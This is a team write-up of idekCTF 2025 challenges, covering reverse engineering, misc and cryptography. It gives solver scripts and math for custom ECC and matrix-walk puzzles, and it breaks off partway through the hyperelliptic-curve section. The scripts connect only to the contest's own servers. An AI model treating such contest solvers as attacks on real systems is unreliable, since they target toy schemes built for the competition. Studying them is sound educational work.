+++
title = "idekCTF 2025 Team WriteUp"
date = "2025-08-09"
description = "AK Cryptography!!!"

[taxonomies]
tags = ["idekCTF", "Team", "WriteUp", "Cryptography", "Reverse", "Web"]
+++

大家在开赛后临时创号玩的，二进制哥们很忙，于是我们就做了一些别的题

质量不错，也许值 65+ 权重

> 博客还在调试，图片显示可能存在问题，在寻找一个好用的对象存储

# idekCTF 2025 Write-ups / Challenge List

| #    | Category | Challenge             | Solved | Points | Note                                                         | Attachments                                          |
| ---- | -------- | --------------------- | ------ | ------ | ------------------------------------------------------------ | ---------------------------------------------------- |
| 1    | sanity   | check                 | 774    | 100    | sanity check, simply print the flag                          | -                                                    |
| 2    | rev      | constructor           | 371    | 100    | Zerotistic said “Heard of constructor?”                      | [constructor.tar.gz](constructor.tar.gz)             |
| 3    | sanity   | survey                | 196    | 100    | quick survey for feedback                                    | -                                                    |
| 4    | misc     | gacha-gate            | 144    | 139    | `nc gacha-gate.chal.idek.team 1337`                          | [gacha-gate.tar.gz](gacha-gate.tar.gz)               |
| 5    | crypto   | Catch                 | 134    | 146    | cat-themed crypto, `nc catch.chal.idek.team 1337`            | [catch.tar.gz](catch.tar.gz)                         |
| 6    | rev      | ski                   | 70     | 231    | two interpreters but “using too many resources” (.𖥔 ݁ ˖⋆ ˚❆)  | [ski.tar.gz](ski.tar.gz)                             |
| 7    | crypto   | Sadness ECC           | 65     | 242    | “doesn't know if it's an elliptic curve or not”              | [sad_ecc.tar.gz](sad_ecc.tar.gz)                     |
| 8    | crypto   | Happy ECC             | 58     | 259    | opposite of Sadness ECC                                      | [happy_ecc.tar.gz](happy_ecc.tar.gz)                 |
| 9    | web      | *midi visualizer      | 38     | 320    | [https://midi-visualizer-web.chal.idek.team](https://midi-visualizer-web.chal.idek.team) | [midi-visualizer.tar.gz](midi-visualizer.tar.gz)     |
| 10   | crypto   | Diamond Ticket        | 37     | 323    | Charles & chocolate factory (harder)                         | [diamond_ticket.tar.gz](diamond_ticket.tar.gz)       |
|      |          |                       |        |        |                                                              |                                                      |
| 12   | crypto   | Sadness ECC - Revenge | 27     | 362    | password = flag from Sadness ECC, `nc sad-ecc-revenge.chal.idek.team 1337` | [sad_ecc_revenge.tar.gz](sad_ecc_revenge.tar.gz)     |
| 13   | crypto   | Happy ECC - Revenge   | 26     | 367    | password = flag from Happy ECC                               | [happy_ecc_revenge.tar.gz](happy_ecc_revenge.tar.gz) |
| 16   | crypto   | FITM                  | 17     | 409    | “Let me share it for you”, `nc fitm.chal.idek.team 1337`     | [FITM.tar.gz](FITM.tar.gz)                           |

> 题目名称前带 `*` 的为赛后做出的

# sanity

## check

签到

## survey

问卷

# rev

## constructor

静态分析

$\text{decrypted}[i] = \text{encrypted}[i] \bigoplus (i * 0x1f) \bigoplus (i >> 1) \bigoplus 0x5a$

> i * 0x1f 的计算结果会发生溢出，我们只需取其低8位即可，这和寄存器 cl 的行为一致

然后导出数据

> 使用 `dd` 导出 42 byte

```bash
dd if=./chall bs=1 skip=$((0x3040)) count=42 2>/dev/null | xxd -i
```

```python
def solve_flag():
    """
    Applies the decryption algorithm found in the binary's constructor
    function to the extracted data.
    """
    # The 42 encrypted bytes from address 0x403040
    encrypted_flag = [
      0x33, 0x21, 0x00, 0x6d, 0x5f, 0xab, 0x86, 0xb4, 0xd4, 0x2d, 0x36, 0x3a,
      0x4e, 0x90, 0x8c, 0xe3, 0xcc, 0x2e, 0x09, 0x6c, 0x49, 0xb8, 0x8f, 0xf7,
      0xcc, 0x22, 0x4e, 0x4d, 0x5e, 0xb8, 0x80, 0xcb, 0xd3, 0xda, 0x20, 0x29,
      0x70, 0x02, 0xb7, 0xd1, 0xb7, 0xc4
    ]

    decrypted_flag = ""
    mask32 = 0xFFFFFFFF  # Used to simulate 32-bit register behavior
    key1_register = 0    # Simulates the %ecx register

    for i in range(42):
        # The encrypted byte is loaded into the low part of a 32-bit register
        encrypted_word = encrypted_flag[i]
        
        # Key 1: The full 32-bit value of the %ecx register
        key1 = key1_register
        
        # Key 2: The loop counter right-shifted by 1
        key2 = i >> 1
        
        # Key 3: The constant 0x5a
        key3 = 0x5a
        
        # The decryption emulates the 32-bit 'xorl' operations
        decrypted_word = encrypted_word ^ key1 ^ key2 ^ key3
        
        # The final character is the lowest byte of the result
        decrypted_byte = decrypted_word & 0xFF
        decrypted_flag += chr(decrypted_byte)
        
        # The %ecx register is incremented for the next loop
        key1_register = (key1_register + 0x1f) & mask32

    return decrypted_flag

final_flag = solve_flag()
print(f"Decrypted Flag: {final_flag}")
```

## ski

Given a SKI combinator program (program.txt) and an interpreter, the challenge encodes the flag as bits, mapping each bit to a variable (_F0, _F1, ...). Each _F{i} is set to K if the bit is 1, or (K I) if 0.

The SKI expression is a sequence of similar blocks, each containing several _F... variables. The number of _F... variables in each block corresponds to a specific bit pattern.

focus on the final part of `txt` file from here:
`(((S ((S I) (K (K I)))) (K K)) _F0)) _F1)) _F2))...`

Each check block has the form (((S ((S I) (K (K I)))) (K K)) ... ) and inside, the number of _F... variables determines the bit pattern to check:

- 1 variable: checks for bit pattern 0
- 2 variables: checks for 01
- 3 variables: checks for 011
- 4 variables: checks for 0111
etc.

script:

```python
import re

data = open("program.txt").read()
segments = re.split(r"\(\(\(S", data)
pattern_map = {1: "0", 2: "01", 3: "011", 4: "0111", 5: "01111", 6: "011111"}

bits = "".join(pattern_map[len(re.findall(r"_F\d+", seg))] for seg in segments if re.findall(r"_F\d+", seg))
flag = "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8) if len(bits[i:i+8]) == 8)
print(flag)
```

# misc

## gacha-gate

题目

```python
#!/usr/bin/env python3
import contextlib
import os
import random
import re
import signal
import sys

from z3 import ArithRef, BitVec, BitVecRef, BitVecVal, Solver, simplify, unsat

WIDTH = 32
OPS = ['~', '&', '^', '|']
MAX_DEPTH = 10
FLAG = os.getenv('FLAG', 'idek{fake_flag}')
VARS = set('iIl')


def rnd_const() -> tuple[str, BitVecRef]:
    v = random.getrandbits(WIDTH)
    return str(v), BitVecVal(v, WIDTH)


def rnd_var() -> tuple[str, BitVecRef]:
    name = ''.join(random.choices(tuple(VARS), k=10))
    return name, BitVec(name, WIDTH)


def combine(
    op: str,
    left: tuple[str, BitVecRef],
    right: tuple[str, BitVecRef] | None = None,
) -> tuple[str, ArithRef]:
    if op == '~':
        s_left, z_left = left
        return f'(~{s_left})', ~z_left
    s_l, z_l = left
    s_r, z_r = right
    return f'({s_l} {op} {s_r})', {
        '&': z_l & z_r,
        '^': z_l ^ z_r,
        '|': z_l | z_r,
    }[op]


def random_expr(depth: int = 0) -> tuple[str, ArithRef]:
    if depth >= MAX_DEPTH or random.random() < 0.1:
        return random.choice((rnd_var, rnd_const))()
    op = random.choice(OPS)
    if op == '~':
        return combine(op, random_expr(depth + 1))
    return combine(op, random_expr(depth + 1), random_expr(depth + 1))


TOKEN_RE = re.compile(r'[0-9]+|[iIl]+|[~&^|]')


def parse_rpn(s: str) -> ArithRef:
    tokens = TOKEN_RE.findall(s)
    if not tokens:
        raise ValueError('empty input')

    var_cache: dict[str, BitVecRef] = {}
    stack: list[BitVecRef] = []

    for t in tokens:
        if t.isdigit():
            stack.append(BitVecVal(int(t), WIDTH))
        elif re.fullmatch(r'[iIl]+', t):
            if t not in var_cache:
                var_cache[t] = BitVec(t, WIDTH)
            stack.append(var_cache[t])
        elif t in OPS:
            if t == '~':
                if len(stack) < 1:
                    raise ValueError('stack underflow')
                a = stack.pop()
                stack.append(~a)
            else:
                if len(stack) < 2:
                    raise ValueError('stack underflow')
                b = stack.pop()
                a = stack.pop()
                stack.append({'&': a & b, '^': a ^ b, '|': a | b}[t])
        else:
            raise ValueError(f'bad token {t}')

    if len(stack) != 1:
        raise ValueError('malformed expression')
    return stack[0]


def equivalent(e1: ArithRef, e2: ArithRef) -> tuple[bool, Solver]:
    s = Solver()
    s.set(timeout=5000)
    s.add(simplify(e1) != simplify(e2))
    return s.check() == unsat, s


def _timeout_handler(_: int, __) -> None:
    raise TimeoutError


def main() -> None:
    signal.signal(signal.SIGALRM, _timeout_handler)
    print('lets play a game!')

    for _ in range(50):
        random.seed()
        expr_str, expr_z3 = random_expr()
        print(expr_str, flush=True)

        signal.alarm(5)
        try:
            line = sys.stdin.readline()
            signal.alarm(0)
        except TimeoutError:
            print('too slow!')
            return

        try:
            rpn_z3 = parse_rpn(line.strip())
        except Exception as e:
            print('invalid input:', e)
            return

        print('let me see..')
        is_eq, s = equivalent(expr_z3, rpn_z3)
        if not is_eq:
            print('wrong!')
            with contextlib.suppress(BaseException):
                print('counter example:', s.model())
            return

    print(FLAG)


if __name__ == '__main__':
    main()

```

![](img/misc_gacha-gate.png)

```python
def solve():
    """
    Connects to the server, solves 50 challenges, and gets the flag.
    """
    HOST = 'gacha-gate.chal.idek.team'
    PORT = 1337
    conn = remote(HOST, PORT)

    # CRITICAL: Receive and discard the initial banner to sync with the server.
    conn.recvuntil(b'lets play a game!\n')
    log.info("Initial banner received. Starting challenges...")

    for i in range(50):
        try:
            # Now, this will correctly read the first mathematical expression.
            infix_expr = conn.recvline().decode().strip()
            if not infix_expr: # Handle empty lines just in case
                continue
            
            log.info(f"[{i+1}/50] Received: {infix_expr}")
            
            # Convert the expression to RPN
            rpn_expr = shunting_yard(infix_expr)
            log.success(f"[{i+1}/50] Sending:   {rpn_expr}")
            
            # Send the RPN solution
            conn.sendline(rpn_expr.encode())
            
            # The server will respond with "let me see.." before the next challenge.
            # We can optionally read this to stay in sync, but for this specific
            # challenge, reading only at the top of the loop is sufficient.
            conn.recvline() # Consume the "let me see.." line

        except EOFError:
            log.error("Connection closed by server. This likely happened after an incorrect answer.")
            break
        except Exception as e:
            log.error(f"An error occurred: {e}")
            conn.close()
            return
            
    # After the loop, try to receive the flag
    try:
        flag = conn.recvall(timeout=2).decode().strip()
        if "idek{" in flag:
            log.success(f"Success! Flag: {flag}")
        else:
            log.warning(f"Loop finished, but no flag received. Server response: {flag}")
    except Exception as e:
        log.error(f"Could not receive flag. Error: {e}")
    finally:
        conn.close()

# The rest of the script (imports, shunting_yard, etc.) remains the same.
# Make sure to call solve() at the end.
if __name__ == "__main__":
    solve()
```

## Catch

题目

```python
from Crypto.Random.random import randint, choice
import os

# In a realm where curiosity roams free, our fearless cat sets out on an epic journey.
# Even the cleverest feline must respect the boundaries of its world—this magical limit holds all wonders within.
limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f

# Through cryptic patterns, our cat deciphers its next move.
def walking(x, y, part):
    # Each step is guided by a fragment of the cat's own secret mind.
    epart = [int.from_bytes(part[i:i+2], "big") for i in range(0, len(part), 2)]
    xx = epart[0] * x + epart[1] * y
    yy = epart[2] * x + epart[3] * y
    return xx, yy

# Enter the Cat: curious wanderer and keeper of hidden paths.
class Cat:
    def __init__(self):
        # The cat's starting position is born of pure randomness.
        self.x = randint(0, 2**256)
        self.y = randint(0, 2**256)
        # Deep within, its mind holds a thousand mysterious fragments.
        while True:
            self.mind = os.urandom(1000)
            self.step = [self.mind[i:i+8] for i in range(0, 1000, 8)]
            if len(set(self.step)) == len(self.step):
                break

    # The epic chase begins: the cat ponders and strides toward the horizon.
    def moving(self):
        for _ in range(30):
            # A moment of reflection: choose a thought from the cat's endless mind.
            part = choice(self.step)
            self.step.remove(part)
            # With each heartbeat, the cat takes a cryptic step.
            xx, yy = walking(self.x, self.y, part)
            self.x, self.y = xx, yy
            # When the wild spirit reaches the edge, it respects the boundary and pauses.
            if self.x > limit or self.y > limit:
                self.x %= limit
                self.y %= limit
                break

    # When the cosmos beckons, the cat reveals its secret coordinates.
    def position(self):
        return (self.x, self.y)

# Adventurer, your quest: find and connect with 20 elusive cats.
for round in range(20):
    try:
        print(f"👉 Hunt {round+1}/20 begins!")
        cat = Cat()

        # At the start, you and the cat share the same starlit square.
        human_pos = cat.position()
        print(f"🐱✨ Co-location: {human_pos}")
        print(f"🔮 Cat's hidden mind: {cat.mind.hex()}")

        # But the cat, ever playful, dashes into the unknown...
        cat.moving()
        print("😸 The chase is on!")

        print(f"🗺️ Cat now at: {cat.position()}")

        # Your turn: recall the cat's secret path fragments to catch up.
        mind = bytes.fromhex(input("🤔 Path to recall (hex): "))

        # Step by step, follow the trail the cat has laid.
        for i in range(0, len(mind), 8):
            part = mind[i:i+8]
            if part not in cat.mind:
                print("❌ Lost in the labyrinth of thoughts.")
                exit()
            human_pos = walking(human_pos[0], human_pos[1], part)

        # At last, if destiny aligns...
        if human_pos == cat.position():
            print("🎉 Reunion! You have found your feline friend! 🐾")
        else:
            print("😿 The path eludes you... Your heart aches.")
            exit()
    except Exception:
        print("🙀 A puzzle too tangled for tonight. Rest well.")
        exit()

# Triumph at last: the final cat yields the secret prize.
print(f"🏆 Victory! The treasure lies within: {open('flag.txt').read()}")
```

This is a classic "meet-in-the-middle" or search problem disguised as a random walk. However, the search space is far too large for a brute-force attack. The key lies in reversing the process and exploiting a mathematical property of the transformations.

### Analysis of the Challenge

The core of the challenge is the `walking` function, which applies a linear transformation (a 2x2 matrix multiplication) to the cat's coordinates `(x, y)`. Each of the 125 unique 8-byte `part`s from the cat's `mind` corresponds to a unique transformation matrix.

The `moving` function applies 30 of these transformations sequentially. The parts are chosen without replacement. A crucial observation is the condition for breaking the loop: `if self.x > limit or self.y > limit`.

1.  **Initial State**: The cat starts with coordinates `x` and `y`, which are random 256-bit integers (`~2^256`).
2.  **Transformation**: The matrix elements (`epart`) are 16-bit integers.
3.  **Coordinate Growth**: At each step, the bit length of the coordinates increases by approximately 17 bits. Starting from \~256 bits, after 30 steps, the coordinates will have a bit length of roughly `256 + 30 * 17 = 766` bits.
4.  **The `limit`**: The `limit` is a 1024-bit integer.
5.  **Conclusion**: Since the coordinates grow to about 766 bits, they will **never exceed the 1024-bit `limit`**. This means the `break` statement is never triggered, and the loop always runs for exactly **30 steps**. The final position is calculated without any modulo operations.

Our task is to find the exact sequence of 30 transformations that maps the initial position `(x_0, y_0)` to the final position `(x_f, y_f)`.

### The Reversal Strategy

Let the sequence of transformation matrices be $M_1, M_2, \ldots, M_{30}$. The final position vector $v_f$ is given by:
$$v_f = M_{30} \cdot M_{29} \cdots M_1 \cdot v_0$$

Since matrix multiplication is associative, we can work backward one step at a time:
$$v_{29} = M_{30}^{-1} \cdot v_f$$

The inverse of a 2x2 matrix $M = \begin{pmatrix} a & b \\ c & d \end{pmatrix}$ is $M^{-1} = \frac{1}{\det(M)} \begin{pmatrix} d & -b \\ -c & a \end{pmatrix}$.

For the coordinates of $v_{29}$ to be integers (as they are at every step of the cat's journey), the vector $\begin{pmatrix} d & -b \\ -c & a \end{pmatrix} \cdot v_f$ must be component-wise divisible by $\\det(M_{30})$.

This divisibility requirement is a very strong constraint. For any given matrix, the probability that this condition holds is extremely low. Therefore, at each step of our backward search, we can almost uniquely identify which matrix was applied.

The strategy is to perform a depth-first search (DFS) backward from the final position `(x_f, y_f)`.

1.  Start at `(x_f, y_f)`.
2.  Iterate through all 125 possible parts.
3.  For each part, form its matrix `M` and calculate its determinant `det(M)`.
4.  Check if `M` could have been the last matrix applied (`M_30`) by testing the divisibility constraint.
5.  If the constraint holds, calculate the previous position `v_29` and recursively search from there with the remaining 124 parts.
6.  Continue this process for 30 steps until we reach the initial position `(x_0, y_0)`.

This will efficiently reveal the unique sequence of 30 parts in reverse order.

### The Solution Script

Here is a Python script using `pwntools` to automate the process for all 20 rounds.

```python
#!/usr/bin/env python3
from pwn import *
import ast

def get_matrix_from_part(part):
    """Parses an 8-byte part into a tuple of 4 integers (matrix elements)."""
    a = int.from_bytes(part[0:2], "big")
    b = int.from_bytes(part[2:4], "big")
    c = int.from_bytes(part[4:6], "big")
    d = int.from_bytes(part[6:8], "big")
    return (a, b, c, d)

def solve_round(initial_pos, final_pos, all_parts):
    """
    Solves a single round using an iterative Depth-First Search (DFS)
    based on the divisibility constraint.
    """
    # Stack for DFS: (current_target_pos, available_parts_set, path_in_reverse)
    stack = [(final_pos, frozenset(all_parts), [])]

    while stack:
        current_pos, available, path_rev = stack.pop()

        if len(path_rev) == 30:
            if current_pos == initial_pos:
                log.success("Found the correct path of 30 steps!")
                # The path was built in reverse, so we flip it.
                return b"".join(path_rev[::-1])
            continue

        tx, ty = current_pos
        for part in available:
            a, b, c, d = get_matrix_from_part(part)
            det = a * d - b * c
            if det == 0:
                continue

            # Calculate the numerators for the inverse transformation
            prev_x_num = d * tx - b * ty
            prev_y_num = -c * tx + a * ty

            # The key insight: intermediate coordinates must be integers.
            if prev_x_num % det == 0 and prev_y_num % det == 0:
                prev_pos = (prev_x_num // det, prev_y_num // det)
                stack.append((prev_pos, available - {part}, path_rev + [part]))
    
    return None # Should not be reached

def main():
    conn = remote("catch.chal.idek.team", 1337)
    
    for round_num in range(20):
        conn.recvuntil(b"begins!\n")
        
        # Parse initial position
        line_co_location = conn.recvline().decode().strip()
        x0, y0 = ast.literal_eval(line_co_location.split(": ")[1])
        
        # Parse the cat's mind
        line_mind = conn.recvline().decode().strip()
        mind_hex = line_mind.split(": ")[1]
        mind_bytes = bytes.fromhex(mind_hex)
        all_parts = [mind_bytes[i:i+8] for i in range(0, 1000, 8)]
        
        conn.recvuntil(b"The chase is on!\n")
        
        # Parse final position
        line_final_pos = conn.recvline().decode().strip()
        xf, yf = ast.literal_eval(line_final_pos.split(": ")[1])
        
        log.info(f"--- Starting Hunt {round_num+1}/20 ---")

        # Solve the round
        solution_path_bytes = solve_round((x0, y0), (xf, yf), all_parts)
        
        if solution_path_bytes is None:
            log.error("Solver failed. Something is wrong with the assumptions.")
            conn.close()
            return

        solution_hex = solution_path_bytes.hex()
        conn.sendlineafter(b"Path to recall (hex): ", solution_hex.encode())
        
        response = conn.recvline()
        if b"Reunion!" not in response:
            log.error("Submitted the wrong path.")
            print(response.decode())
            conn.close()
            return
            
    flag = conn.recvall().decode()
    log.success(f"Flag: {flag}")

if __name__ == "__main__":
    main()
```

## Sadness ECC

题目

```
# chall.py
from Crypto.Util.number import *
from secret import n, xG, yG
import ast

class DummyPoint:
    O = object()

    def __init__(self, x=None, y=None):
        if (x, y) == (None, None):
            self._infinity = True
        else:
            assert DummyPoint.isOnCurve(x, y), (x, y)
            self.x, self.y = x, y
            self._infinity = False

    @classmethod
    def infinity(cls):
        return cls()

    def is_infinity(self):
        return getattr(self, "_infinity", False)

    @staticmethod
    def isOnCurve(x, y):
        return "<REDACTED>"

    def __add__(self, other):
        if other.is_infinity():
            return self
        if self.is_infinity():
            return other

        # ——— Distinct‑points case ———
        if self.x != other.x or self.y != other.y:
            dy    = self.y - other.y
            dx    = self.x - other.x
            inv_dx = pow(dx, -1, n)
            prod1 = dy * inv_dx
            s     = prod1 % n

            inv_s = pow(s, -1, n)
            s3    = pow(inv_s, 3, n)

            tmp1 = s * self.x
            d    = self.y - tmp1

            d_minus    = d - 1337
            neg_three  = -3
            tmp2       = neg_three * d_minus
            tmp3       = tmp2 * inv_s
            sum_x      = self.x + other.x
            x_temp     = tmp3 + s3
            x_pre      = x_temp - sum_x
            x          = x_pre % n

            tmp4       = self.x - x
            tmp5       = s * tmp4
            y_pre      = self.y - tmp5
            y          = y_pre % n

            return DummyPoint(x, y)

        dy_term       = self.y - 1337
        dy2           = dy_term * dy_term
        three_dy2     = 3 * dy2
        inv_3dy2      = pow(three_dy2, -1, n)
        two_x         = 2 * self.x
        prod2         = two_x * inv_3dy2
        s             = prod2 % n

        inv_s         = pow(s, -1, n)
        s3            = pow(inv_s, 3, n)

        tmp6          = s * self.x
        d2            = self.y - tmp6

        d2_minus      = d2 - 1337
        tmp7          = -3 * d2_minus
        tmp8          = tmp7 * inv_s
        x_temp2       = tmp8 + s3
        x_pre2        = x_temp2 - two_x
        x2            = x_pre2 % n

        tmp9          = self.x - x2
        tmp10         = s * tmp9
        y_pre2        = self.y - tmp10
        y2            = y_pre2 % n

        return DummyPoint(x2, y2)

    def __rmul__(self, k):
        if not isinstance(k, int) or k < 0:
            raise ValueError("Choose another k")
        
        R = DummyPoint.infinity()
        addend = self
        while k:
            if k & 1:
                R = R + addend
            addend = addend + addend
            k >>= 1
        return R

    def __repr__(self):
        return f"DummyPoint({self.x}, {self.y})"

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

if __name__ == "__main__":
    G = DummyPoint(xG, yG)
    print(f"{n = }")
    stop = False
    while True:
        print("1. Get random point (only one time)\n2. Solve the challenge\n3. Exit")
        try:
            opt = int(input("> "))
        except:
            print("❓ Try again."); continue

        if opt == 1:
            if stop:
                print("Only one time!")
            else:
                stop = True
                k = getRandomRange(1, n)
                P = k * G
                print("Here is your point:")
                print(P)

        elif opt == 2:
            ks = [getRandomRange(1, n) for _ in range(2)]
            Ps = [k * G for k in ks]
            Ps.append(Ps[0] + Ps[1])

            print("Sums (x+y):", [P.x + P.y for P in Ps])
            try:
                ans = ast.literal_eval(input("Your reveal: "))
            except:
                print("Couldn't parse."); continue

            if all(P == DummyPoint(*c) for P, c in zip(Ps, ans)):
                print("Correct! " + open("flag.txt").read())
            else:
                print("Wrong...")
            break

        else:
            print("Farewell.") 
            break
            
```


### 解题思路：奇异曲线上的坐标恢复

本次挑战的核心在于一个自定义的、非标准的 **“椭圆曲线”** 密码系统。服务器没有直接给出点的坐标，而是给了两个随机点 $P_1$、$P_2$ 以及它们的和 $P_3=P_1+P_2$ 的 **坐标之和**（即 $x_i+y_i$）。
我们的任务是仅根据这些和，恢复出这三个点的完整坐标。

### 第一步：恢复曲线方程

挑战代码中最关键的函数 `isOnCurve` 被隐藏，因此必须 **从点的加法运算 (`__add__`) 中反向推导出曲线方程**。
点加法分为两种情况：**两点相加** 和 **点倍加**。通常点倍加的公式更简洁，是推导的突破口。

下面是点倍加相关的代码（已作简化）：

```python
dy_term = self.y - 1337
dy2     = dy_term * dy_term
# ...
s = (2 * self.x) * pow(3 * dy2, -1, n)
```

* `s` 表示点 $P(x,y)$ 处切线的斜率。
可写成数学形式：

$$
s = \frac{2x}{3(y-1337)^2}\pmod n
$$

对于隐式曲线 $F(x,y)=0$ 上的任意点，切线斜率满足

$$
\frac{dy}{dx}= -\frac{\partial F/\partial x}{\partial F/\partial y}
$$

把代码里得到的斜率 $s$ 与上述公式对应，可得到假设：

$$
\begin{aligned}
\frac{\partial F}{\partial x} &= -k\cdot 2x ,\\
\frac{\partial F}{\partial y} &= k\cdot 3(y-1337)^2,
\end{aligned}
$$

其中 $k$ 为常数（取 $k=-1$ 简化）。对两式分别积分得

$$
\begin{aligned}
F(x,y) &= \int 2x\,dx = x^2 + g(y),\\
F(x,y) &= \int -3(y-1337)^2\,dy = -(y-1337)^3 + h(x).
\end{aligned}
$$

取常数为 0，得到 **曲线方程**

$$
\boxed{\,x^{2} \equiv (y-1337)^{3}\pmod n\,}
$$

即

$$
x^{2} \equiv (y-1337)^{3}\pmod n,
$$

它是一条 **奇异曲线**（在点 $(0,1337)$ 处有尖点），虽然不是正规椭圆曲线，但在其非奇异点仍可定义加法群。 

---

### 第二步：分析挑战与漏洞

已知三个值 $s_1,s_2,s_3$ 满足：

* $P_1=(x_1,y_1)$ 在曲线上且

  $$
  x_1+y_1 = s_1 \pmod n \quad\Rightarrow\quad y_1 = s_1 - x_1 \pmod n.
  $$

* $P_2=(x_2,y_2)$ 同理，满足

  $$
  y_2 = s_2 - x_2 \pmod n.
  $$

* $P_3=P_1+P_2 = (x_3,y_3)$ 且

  $$
  x_3 + y_3 = s_3 \pmod n .
  $$

对每个点 $P_i$ 有两条约束：

1. **线性关系**

   $$
   y_i = s_i - x_i \pmod n .
   $$

2. **曲线方程**

   $$
   x_i^{2} = (y_i-1337)^{3} \pmod n .
   $$

把线性关系代入曲线方程，得到单变量三次方程

$$
\boxed{\,x_i^{2} = (s_i - x_i - 1337)^{3} \pmod n\,},
$$

每个点分别对应一个方程。单独求解这三个方程虽然可行，却忽略了**点加法**的代数关联。脚本利用了此关联，构造更强的约束来直接求解。

---

### 第三步：求解策略 —— 多项式结式 (Polynomial Resultant)

核心思路：利用 **结式**（Resultant）消去变量，从而把多元方程系统转化为一元方程。

### 1. 构造约束多项式

- **点 $P_1$ 的约束**（代入 $y_1=s_1-x_1$）

  $$
  E_1(x_1) \;=\; x_1^{2} - (s_1 - x_1 - 1337)^{3}\;\equiv\;0\pmod n .
  $$

- **点 $P_2$ 的约束**

  $$
  E_2(x_2) \;=\; x_2^{2} - (s_2 - x_2 - 1337)^{3}\;\equiv\;0\pmod n .
  $$

- **点加法约束**
  设 $P_3=(x_3,y_3)$。两点相加的（简化）公式为

  $$
  \begin{aligned}
  \lambda & = \frac{y_2 - y_1}{x_2 - x_1},\\
  x_3 & = \lambda^{2} - x_1 - x_2,\\
  y_3 & = \lambda(x_1 - x_3) - y_1 .
  \end{aligned}
  $$

  代入 $y_1=s_1-x_1$, $y_2=s_2-x_2$ 并使用 $x_3+y_3=s_3$，可得到只含 $x_1,x_2$ 的多项式

  $$
  F(x_1,x_2)=0 .
  $$

于是得到 **三方程系统**

$$
\begin{cases}
E_1(x_1) = 0,\\
E_2(x_2) = 0,\\
F(x_1,x_2) = 0 .
\end{cases}
$$

### 2. 第一次消元

计算 **结式**，消去 $x_1$：

$$
R_1(x_2)=\operatorname{resultant}\big(F(x_1,x_2),\,E_1(x_1),\,x_1\big) .
$$

此时 $R_1(x_2)$ 只含变量 $x_2$，它的根即为满足前两条约束的 $x_2$。

### 3. 取公共根

需要 $x_2$ 同时满足

$$
R_1(x_2)=0,\qquad E_2(x_2)=0 .
$$

使用 **最大公约数**（GCD）求公共根：

$$
g(x_2)=\gcd\big(R_1(x_2),\,E_2(x_2)\big) .
$$

在唯一解的情况下，$g$ 必为一次多项式

$$
g(x_2)=c\,(x_2-x_{2,\text{sol}}) .
$$

于是可直接读取

$$
x_{2,\text{sol}} = \text{根}(g) .
$$

### 4. 回代求解

* 计算 $y_2 = s_2 - x_2$（模 $n$）得到 $P_2$ 完整坐标。
* 交换角色或再利用一次 **resultant** 可以求出 $x_1$ 与 $y_1$。
* 最后直接调用源码中的 `__add__`（或使用上面的公式）计算

  $$
  P_3 = P_1 + P_2
  $$

  得到 $(x_3, y_3)$ 并验证 $x_3 + y_3 \equiv s_3\pmod n$。

---

### 小结

1. **从点倍加的斜率**逆推出了奇异曲线方程

   $$
   x^{2} \equiv (y-1337)^{3}\pmod n .
   $$

2. **利用线性关系**把每个点的坐标化为单变量三次方程。
3. **构造点加法约束**得到两变量多项式 $F(x_1,x_2)$。
4. **利用结式与 GCD** 消除变量，得到唯一的 $x_2$（进而得到全部点的坐标）。

这样即可仅凭 “坐标之和” 恢复出所有点的完整坐标，完成挑战。

Exploit 如下题，直接看 `Sadness ECC - Revenge`

## Happy ECC

### 题目一：Happy ECC - Revenge

这道题是一个基于超椭圆曲线密码学的挑战。我们需要在一个未知的二亏格（genus 2）超椭圆曲线上，计算一个给定点的阶。

#### **解题思路**

核心分为三个步骤：
1.  **恢复曲线方程**: 由于曲线方程 $y^2 = f(x)$ 中的多项式 $f(x)$ 是未知的，我们首先需要利用题目提供的信息来恢复它。
2.  **计算群阶**: 在获得完整的曲线定义后，计算其雅可比群（Jacobian group）的总阶。
3.  **计算点的真阶**: 利用群的总阶和拉格朗日定理，计算出目标点的真实阶。

---

#### **第一步：恢复曲线多项式 $f(x)$**

题目中的超椭圆曲线定义在有限域 $GF(p)$ 上，形式为 $y^2 = f(x)$，其中 $f(x)$ 是一个首一（monic）的5次多项式。曲线的亏格 $g = \lfloor(\deg(f)-1)/2\rfloor = \lfloor(5-1)/2\rfloor = 2$。

在超椭圆曲线的雅可比群中，元素（除子）通常用 **Mumford 表示法** 表示为一个二元组 $(U(x), V(x))$，其中 $U, V$ 都是多项式，且满足以下关键性质：
1.  $U(x)$ 是首一多项式，且其次数 $\deg(U) \le g$。
2.  $\deg(V) < \deg(U)$。
3.  $V(x)^2 \equiv f(x) \pmod{U(x)}$。

这个关系是恢复 $f(x)$ 的基础。我们可以通过与服务器交互，多次选择选项1，获取几个点 $P_i = (U_i, V_i)$。对于每个点，我们都得到一个关于未知多项式 $f(x)$ 的同余方程：
$$f(x) \equiv V_i(x)^2 \pmod{U_i(x)}$$
由于 $f(x)$ 的次数为5，而每个 $U_i(x)$ 的次数都为 $g=2$，我们需要足够多的同余方程来唯一确定 $f(x)$。脚本中请求了3个点，得到了一个同余方程组：
$$\begin{cases} f(x) \equiv V_1(x)^2 \pmod{U_1(x)} \\ f(x) \equiv V_2(x)^2 \pmod{U_2(x)} \\ f(x) \equiv V_3(x)^2 \pmod{U_3(x)} \end{cases}$$
三个模数 $U_1, U_2, U_3$ 的乘积次数为 $2+2+2=6$，大于 $f(x)$ 的次数5。因此，我们可以使用**多项式中国剩余定理 (Chinese Remainder Theorem for Polynomials)** 来解出这个方程组，从而唯一确定 $f(x)$。`solve.py` 脚本中的 `CRT_list` 函数正是实现了这个功能。

---

#### **第二步：计算雅可比群的阶**

在恢复了 $f(x)$ 后，我们就得到了曲线的完整定义。曲线的雅可比群 $J(C)$ 是一个有限阿贝尔群，其阶（即群中元素的数量）可以通过计算 **Frobenius 自同态的特征多项式** $\chi_C(t)$ 得到。
雅可比群的阶 $|J(C)|$ 由下式给出：
$$|J(C)| = \chi_C(1)$$
